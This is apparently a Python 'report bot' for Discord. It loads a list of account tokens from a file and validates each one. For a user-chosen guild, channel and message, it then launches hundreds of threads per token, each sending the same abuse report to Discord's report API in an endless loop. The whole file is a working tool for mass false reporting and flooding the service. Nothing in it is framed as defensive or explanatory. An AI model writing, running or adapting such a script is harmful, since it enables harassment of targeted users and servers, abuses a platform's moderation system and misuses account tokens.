import requests
import time
import logging
import ctypes
import os
from threading import Thread
from colorama import Fore

kernel32 = ctypes.windll.kernel32
tokens = open("data/token.txt", "r").read().splitlines()

logging.basicConfig(
    level=logging.INFO,
    format=f"{Fore.GREEN}[{Fore.RESET}!{Fore.GREEN}] {Fore.RESET}%(message)s{Fore.RESET}",
)

class Discord: 
    def check(token):
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
            'Accept': '*/*',
        }
        r = requests.get(f'https://discord.com/api/v9/users/@me/library', headers=headers)
        if r.status_code == 200:
            logging.info("Token Validated!")
            print()
        else:
            logging.info("Token Invalid")
            time.sleep(5)

    def report(token, channel, guild, message):
        global checked
        checked = 0
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
            'Accept': '*/*',
        }
        json = {
            "channel_id": channel,
            "guild_id": guild,
            "message_id": message,
            "reason": reason
        }
        while True:
            r = requests.post("https://discord.com/api/v9/report", headers=headers, json=json)
            if r.status_code == 201:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[REPORT BOT] | %s" % checked + ' SENT')
                checked += 1
                logging.info("Report Sent Successfully!")
            else:
                print(Fore.RED + "[" + Fore.RESET + "!" + Fore.RED + "]" + Fore.RESET + " Error Sending Report!")

    def get_reason():
        print(f"""{Fore.GREEN}[{Fore.RESET}{0}{Fore.GREEN}]{Fore.RESET} Illegal Content
{Fore.GREEN}[{Fore.RESET}{1}{Fore.GREEN}]{Fore.RESET} Harassment
{Fore.GREEN}[{Fore.RESET}{2}{Fore.GREEN}]{Fore.RESET} Spam or Phishing Links
{Fore.GREEN}[{Fore.RESET}{3}{Fore.GREEN}]{Fore.RESET} Self-Harm
{Fore.GREEN}[{Fore.RESET}{4}{Fore.GREEN}]{Fore.RESET} NSFW Content
        """)
        while True: 
            reason = input(Fore.GREEN + "[" + Fore.RESET + "?" + Fore.GREEN + "]" + Fore.RESET + " Reason >> ")
            if reason in list('01234'):
                return reason
            print(Fore.RED + "[" + Fore.RESET + "!" + Fore.RED + "]" + Fore.RESET + " Invalid Reason!")
            print()
                
if __name__ == '__main__':
    os.system('cls')
    reason = Discord.get_reason()
    for token in tokens: 
        Discord.check(token)
        guild = input(Fore.GREEN + "[" + Fore.RESET + "?" + Fore.GREEN + "]" + Fore.RESET + " Guild ID >> ")
        channel = input(Fore.GREEN + "[" + Fore.RESET + "?" + Fore.GREEN + "]" + Fore.RESET + " Channel ID >> ")
        message = input(Fore.GREEN + "[" + Fore.RESET + "?" + Fore.GREEN + "]" + Fore.RESET + " Message ID >> ")
        print()
        for i in range(250, 1000):
            Thread(target=Discord.report, args=(token, channel, guild, message)).start()
